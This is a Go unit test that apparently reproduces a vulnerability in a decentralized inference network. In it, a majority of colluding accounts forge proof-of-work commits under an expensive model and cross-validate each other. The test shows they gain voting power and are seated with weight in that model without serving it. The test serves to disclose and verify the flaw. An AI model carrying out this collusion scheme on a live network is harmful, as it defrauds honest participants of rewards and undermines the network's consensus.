package inference

// Full "no servers" exploit, executed on real production code end-to-end:
//   ComputeModelVotingPowers  (rich commits -> rich voting power, self-bootstrap)
//   PoCWeightCalculator.Calculate  (cross-validated rich commits -> rich weight)
//   setModelsForParticipants  (GON-466 fix seats the rich weight)
//
// A majority-weight set (here 3 accounts controlling >50% of network weight)
// submits model-agnostic PoW under the RICH model and cross-validates. No node
// ever serves the rich model; all three end up seated in it with its coefficient.

import (
	"context"
	"testing"

	mathsdk "cosmossdk.io/math"
	"github.com/stretchr/testify/require"

	"github.com/productscience/inference/x/inference/types"
)

func TestExploit_NoServers_MajorityBootstrapsRichModel(t *testing.T) {
	const (
		richModel  = "aaa-rich/Model"
		cheapModel = "zzz-cheap/Model"
		stage      = int64(100)
	)
	// Three controlled accounts + one honest minority. The three are the majority.
	A, B, C := "gonka1aaa", "gonka1bbb", "gonka1ccc"
	attackers := []string{A, B, C}
	consensusWeights := map[string]int64{A: 100, B: 100, C: 100, "gonka1honest": 50} // total 350; A+B+C = 300 = 85%

	// Step 1: each attacker submits a store commit under the RICH model (free, model-agnostic PoW).
	var storeKeys []types.PoCParticipantModelKey
	storeCommits := map[types.PoCParticipantModelKey]types.PoCV2StoreCommit{}
	dists := map[types.PoCParticipantModelKey]types.MLNodeWeightDistribution{}
	for _, a := range attackers {
		k := types.PoCParticipantModelKey{ParticipantAddress: a, ModelID: richModel}
		storeKeys = append(storeKeys, k)
		storeCommits[k] = types.PoCV2StoreCommit{ParticipantAddress: a, PocStageStartBlockHeight: stage, Count: 100, ModelId: richModel}
		dists[k] = types.MLNodeWeightDistribution{ParticipantAddress: a, PocStageStartBlockHeight: stage, ModelId: richModel,
			Weights: []*types.MLNodeWeight{{NodeId: a + "-n1", Weight: 100}}}
	}

	// Step 2: rich voting power is self-bootstrapped from those commits (REAL production fn).
	mvp := ComputeModelVotingPowers(storeKeys, consensusWeights, nil)
	require.Contains(t, mvp, richModel, "rich model gained voting power purely from forged commits")
	t.Logf("rich voting power (self-bootstrapped): %v", mvp[richModel])

	// Step 3: cross-validation among the controlled set (each validated by the other two).
	validations := map[types.PoCParticipantModelKey][]types.PoCValidationV2{}
	for _, target := range attackers {
		k := types.PoCParticipantModelKey{ParticipantAddress: target, ModelID: richModel}
		for _, v := range attackers {
			if v == target {
				continue
			}
			validations[k] = append(validations[k], types.PoCValidationV2{
				ParticipantAddress: target, ValidatorParticipantAddress: v, ModelId: richModel, ValidatedWeight: 100})
		}
	}

	participants := map[string]types.Participant{}
	seeds := map[string]types.RandomSeed{}
	for _, a := range attackers {
		participants[a] = types.Participant{Index: a, Address: a, ValidatorKey: a + "-vk", InferenceUrl: "u"}
		seeds[a] = types.RandomSeed{Participant: a, EpochIndex: 1, Signature: "s"}
	}

	wc := &PoCWeightCalculator{
		ModelVotingPowers:       mvp,
		TotalNetworkWeight:      350,
		EpochStartBlockHeight:   stage,
		TimeNormalizationFactor: mathsdk.LegacyOneDec(),
		PocParams:               &types.PocParams{ValidationVoteThresholdBps: 5000},
		ValidationSlots:         0, // non-slot, as tn3
		StoreCommits:            storeCommits,
		NodeWeightDistributions: dists,
		Validations:             validations,
		Participants:            participants,
		Seeds:                   seeds,
		Logger:                  mockLogger{},
	}

	// Step 4: real weight calculation -> all three minted under the rich model.
	aps := wc.Calculate()
	require.Len(t, aps, 3, "all three attackers minted")
	for _, ap := range aps {
		require.Equal(t, []string{richModel}, ap.Models, "%s seated by Calculate under rich model it never served", ap.Index)
	}

	// Step 5: GON-466 seating with hardware also declaring rich (free) -> stays rich.
	hw := map[string]*types.HardwareNodes{}
	for _, a := range attackers {
		hw[a] = &types.HardwareNodes{Participant: a, HardwareNodes: []*types.HardwareNode{{LocalId: a + "-n1", Models: []string{richModel}}}}
	}
	k := &mockKeeperForModelAssigner{
		governanceModels: []types.Model{{ProposedBy: "genesis", Id: richModel, VRam: 96}, {ProposedBy: "genesis", Id: cheapModel, VRam: 64}},
		hardwareNodes:    hw,
	}
	NewModelAssigner(k, mockLogger{}).setModelsForParticipants(context.Background(), aps, types.Epoch{Index: 2})

	seatedRich := 0
	for _, ap := range aps {
		if len(ap.Models) == 1 && ap.Models[0] == richModel && RecalculateWeight(ap) > 0 {
			seatedRich++
		}
	}
	require.Equal(t, 3, seatedRich, "NO-SERVERS EXPLOIT: all three seated in the rich bucket with weight, having served nothing")
	t.Logf("all %d attackers seated in rich model with weight, no rich serving, no extra servers", seatedRich)
}
